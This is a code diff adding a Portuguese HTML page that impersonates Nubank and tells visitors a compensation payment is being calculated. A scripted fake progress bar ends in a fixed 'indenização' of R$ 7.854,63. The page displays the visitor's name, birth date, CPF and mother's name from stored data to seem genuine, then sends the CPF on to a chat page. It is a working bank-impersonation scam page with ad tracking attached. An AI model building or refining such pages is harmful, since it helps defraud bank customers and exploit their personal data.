@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Verificação</title>
+  <link rel="icon" href="https://nu-atendimento.site/favicon.ico" type="image/x-icon" sizes="256x256">
+  <script src="https://cdn.tailwindcss.com/"></script>
+  <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<script>
+  window.pixelId = "673cd18ac1a87f0eeb7b11d4";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <style>
+    /* Removendo as definições de fonte Inter */
+
+    /* Definindo Arial, Helvetica, sans-serif como fonte padrão para tudo */
+    * {
+      font-family: Arial, Helvetica, sans-serif !important;
+    }
+
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    input,
+    input:focus {
+      box-shadow: none !important;
+      outline: none !important;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    input:focus {
+      border-color: #8a05be !important;
+      border-width: 0 0 2px !important;
+    }
+
+    /* Estilos para barra de progresso de carregamento */
+    .progress-bar {
+      transition: width 0.5s linear;
+    }
+
+    /* Estilos para o player de vídeo */
+    .video-container {
+      position: relative;
+      overflow: hidden;
+      width: 100%;
+      height: 214px;
+    }
+
+    /* Animação de pulsação para o botão */
+    @keyframes pulse {
+      0% {
+        transform: scale(1);
+      }
+
+      50% {
+        transform: scale(1.05);
+      }
+
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    .custom-pulse-animation {
+      animation: pulse 1.5s infinite ease-in-out;
+    }
+
+    .animate-pulse {
+      animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+    }
+
+    /* Thumbnail overlay */
+    .video-thumbnail {
+      position: absolute;
+      inset: 0;
+      background-color: rgba(0, 0, 0, 0.5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      z-index: 10;
+    }
+
+    /* Botão de Play personalizado */
+    .play-button {
+      border-radius: 12px;
+      width: 250px;
+      height: 250px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* Sobrescrevendo configurações do Tailwind */
+    .text-lg,
+    .text-sm,
+    .text-md,
+    .text-xs,
+    .font-semibold,
+    .font-bold {
+      font-family: Arial, Helvetica, sans-serif !important;
+    }
+  </style>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            purple: {
+              primary: '#831BD1'
+            }
+          },
+          fontFamily: {
+            sans: ['Arial', 'Helvetica', 'sans-serif'],
+          }
+        }
+      }
+    }
+
+    // Script para atualizar a barra de progresso
+    document.addEventListener('DOMContentLoaded', function () {
+      let progress = 16.1375;
+      const progressBar = document.querySelector('.progress-bar');
+      const calculoTitle = document.querySelector('h1.text-lg');
+      const calculoDesc = document.querySelector('p.text-sm.text-start');
+      const valorDisponivel = document.querySelector('.flex.items-center.gap-3:last-child p.text-sm');
+      const userName = document.getElementById('user-name');
+      let calculoConcluido = false;
+      let userName_value = '';
+
+      // Duração do vídeo estimada em 133 segundos (2 minutos e 13 segundos)
+      const videoDurationSeconds = 133;
+
+      // Progresso total que falta
+      const remainingProgress = 100 - progress;
+
+      // Calcular o incremento necessário para sincronizar com o vídeo
+      // Usaremos um intervalo de 500ms para uma animação suave
+      const updateInterval = 500; // Meio segundo
+
+      // Quantas atualizações acontecerão durante a duração do vídeo
+      const totalUpdates = (videoDurationSeconds * 1000) / updateInterval;
+
+      // Quanto deve aumentar a cada atualização
+      const incrementPerUpdate = remainingProgress / totalUpdates;
+
+      // Encontrar o botão de saque que já está no HTML
+      const saqueButton = document.getElementById('saque-button');
+
+      // Função para redirecionar para a página de chat
+      saqueButton.addEventListener('click', function () {
+        // Obter os parâmetros da URL atual
+        const urlParams = new URLSearchParams(window.location.search);
+        const cpf = urlParams.get('cpf') || '';
+
+        // Criar a URL para a página de chat
+        const chatUrl = new URL('/consult/chat', window.location.origin);
+
+        // Adicionar CPF à URL
+        if (cpf) {
+          chatUrl.searchParams.set('cpf', cpf);
+        }
+
+        // Copiar todos os parâmetros UTM existentes
+        for (const [key, value] of urlParams.entries()) {
+          if (key !== 'cpf') {  // Evitar duplicação do parâmetro CPF
+            chatUrl.searchParams.set(key, value);
+          }
+        }
+
+        // Redirecionar para a página de chat
+        window.location.href = chatUrl.toString();
+      });
+
+      // Iniciar o intervalo para atualizar a barra de progresso
+      const interval = setInterval(() => {
+        progress += incrementPerUpdate;
+
+        if (progress >= 100) {
+          clearInterval(interval);
+          progress = 100;
+
+          // Quando a barra chegar a 100%, mudar os textos
+          if (!calculoConcluido) {
+            calculoConcluido = true;
+
+            // Obter o nome do usuário
+            userName_value = userName.textContent || '';
+
+            // Atualizar textos
+            if (calculoTitle) {
+              calculoTitle.textContent = `${userName_value}, o seu valor é R$ 7.854,63!`;
+            }
+
+            if (calculoDesc) {
+              calculoDesc.textContent = 'Sua indenização foi calculada com sucesso, clique no botão abaixo para realizar o seu saque indenizatório.';
+            }
+
+            if (valorDisponivel) {
+              const valorSpan = valorDisponivel.querySelector('span:last-child');
+              if (valorSpan) {
+                valorSpan.textContent = 'R$ 7.854,63';
+              }
+            }
+
+            // Mostrar o botão de saque
+            saqueButton.style.display = 'block';
+          }
+        }
+
+        progressBar.style.width = progress + '%';
+      }, updateInterval);
+
+      // Carregar dados do usuário do localStorage
+      const userDataString = localStorage.getItem('userData');
+      if (userDataString) {
+        try {
+          const userData = JSON.parse(userDataString);
+
+          // Preencher os dados nas seções correspondentes
+          document.getElementById('user-name').textContent = userData.nome || '';
+          document.getElementById('user-birthdate').textContent = userData.dataNascimento || '';
+
+          // Formatar o CPF com pontos e traço (000.000.000-00)
+          const formatCPF = (cpf) => {
+            // Garantir que o CPF tenha 11 dígitos, removendo caracteres não numéricos
+            cpf = cpf.replace(/\D/g, '');
+
+            if (cpf.length !== 11) {
+              return cpf; // Retorna o CPF original se não tiver 11 dígitos
+            }
+
+            // Formatação: 000.000.000-00
+            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+          };
+
+          document.getElementById('user-cpf').textContent = formatCPF(userData.cpf) || '';
+          document.getElementById('user-mother').textContent = userData.nomeMae || '';
+        } catch (error) {
+          console.error('Erro ao carregar dados do usuário:', error);
+        }
+      } else {
+        console.warn('Nenhum dado de usuário encontrado no localStorage');
+      }
+    });
+  </script>
+</head>
+
+<body class="overflow-y-hidden max-h-screen bg-[#831BD1]"
+  style="--autoplay-pulse-speed: 2s; font-family: Arial, Helvetica, sans-serif;">
+  <header class="bg-white px-4 shadow-md">
+    <div class="max-w-[1200px] mx-auto flex items-center gap-6">
+      <img alt="" width="1920" height="1080" class="w-auto h-16" style="color:transparent" src="images/nu.webp">
+    </div>
+  </header>
+
+  <div class="flex flex-col">
+    <main class="flex-1 px-4 py-2">
+      <div class="max-w-[400px] w-full mx-auto mb-4">
+        <div class="w-full p-4 space-y-4 bg-white rounded-lg shadow-md">
+          <div class="space-y-2">
+            <h1 class="text-lg font-semibold text-black text-start">Atenção, estamos calculando a sua indenização</h1>
+            <p class="text-sm text-start text-gray-700">Enquanto estamos verificando o valor que você possui a receber,
+              aguarde assistindo o vídeo abaixo</p>
+          </div>
+
+          <div>
+            <div class="w-full bg-gray-200 rounded-full h-2.5">
+              <div class="bg-green-500 h-2.5 rounded-full transition-all duration-200 ease-linear progress-bar"
+                style="width: 16.1375%;"></div>
+            </div>
+          </div>
+
+          <div class="w-full mt-2">
+            <div class="relative w-full" style="padding: 0; height: 214px;">
+              <div class="video-container">
+                <!-- Player de vídeo com autoplay e mudo -->
+                <video id="myVideo" class="w-full h-full object-cover" autoplay="" loop="" muted="" playsinline="">
+                  <source src="media/video.mp4" type="video/mp4">
+                  Seu navegador não suporta a tag de vídeo.
+                </video>
+
+                <!-- Thumbnail overlay com botão de play -->
+                <div id="videoThumbnail" class="video-thumbnail">
+                  <div class="custom-pulse-animation">
+                    <div class="play-button">
+                      <img src="images/Youtube_logo.png" alt="Play" class="w-28 h-20 object-contain">
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Botão de saque - inicialmente oculto -->
+          <button id="saque-button"
+            class="w-full py-4 rounded-md text-white font-bold text-center bg-[#831BD1] hover:bg-[#831BD1]/90"
+            style="margin-top: 16px; height: 48px; display: none; border: none; font-size: 16px;">Sacar minha
+            indenização</button>
+
+          <h2 class="text-md font-bold text-black mt-4">Sua conta Nubank foi identificada!</h2>
+
+          <div class="space-y-3 p-3 mt-2 rounded-md bg-[#EFEFEF]">
+            <div class="flex items-center gap-3">
+              <img alt="" width="24" height="24" class="size-5" src="images/1.svg" style="color: transparent;">
+              <p class="text-sm">
+                <span class="text-black font-semibold">Nome:</span>
+                <span class="text-gray-900" id="user-name">Carregando...</span>
+              </p>
+            </div>
+
+            <div class="flex items-center gap-3">
+              <img alt="" width="24" height="24" class="size-5" src="images/2.svg" style="color: transparent;">
+              <p class="text-sm">
+                <span class="text-black font-semibold">Data de Nascimento:</span>
+                <span class="text-gray-900" id="user-birthdate">Carregando...</span>
+              </p>
+            </div>
+
+            <div class="flex items-center gap-3">
+              <img alt="" width="24" height="24" class="size-5" src="images/3.svg" style="color: transparent;">
+              <p class="text-sm">
+                <span class="text-black font-semibold">CPF:</span>
+                <span class="text-gray-900" id="user-cpf">Carregando...</span>
+              </p>
+            </div>
+
+            <div class="flex items-center gap-3">
+              <img alt="" width="24" height="24" class="size-5" src="images/5.svg" style="color: transparent;">
+              <p class="text-sm">
+                <span class="text-black font-semibold">Valor disponível:</span>
+                Calculando a sua indenização financeira…
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <!-- Script para controle do vídeo -->
+  <script>
+    // Variável para controlar se é a primeira vez que o usuário desmuta o vídeo
+    let firstUnmute = true;
+
+    // Função para iniciar o vídeo com som
+    function startVideo() {
+      const video = document.getElementById('myVideo');
+      const thumbnail = document.getElementById('videoThumbnail');
+
+      // Remover a thumbnail permanentemente
+      thumbnail.style.display = 'none';
+
+      // Desmutar o vídeo
+      video.muted = false;
+
+      // Reiniciar o vídeo
+      video.currentTime = 0;
+
+      // Iniciar a reprodução
+      video.play();
+
+      // Marcar que não é mais a primeira vez
+      firstUnmute = false;
+    }
+
+    // Adicionar evento de clique à thumbnail
+    document.addEventListener('DOMContentLoaded', function () {
+      const thumbnail = document.getElementById('videoThumbnail');
+      const video = document.getElementById('myVideo');
+
+      if (thumbnail) {
+        thumbnail.addEventListener('click', startVideo);
+      }
+
+      // Clique no vídeo (quando a thumbnail não existe mais)
+      video.addEventListener('click', function () {
+        // Só faz algo se a thumbnail já foi removida
+        if (thumbnail.style.display === 'none') {
+          if (video.muted) {
+            // Desmutar
+            video.muted = false;
+          } else {
+            // Mutar
+            video.muted = true;
+          }
+        }
+      });
+    });
+  </script>
+
+</body>
+
+</html>
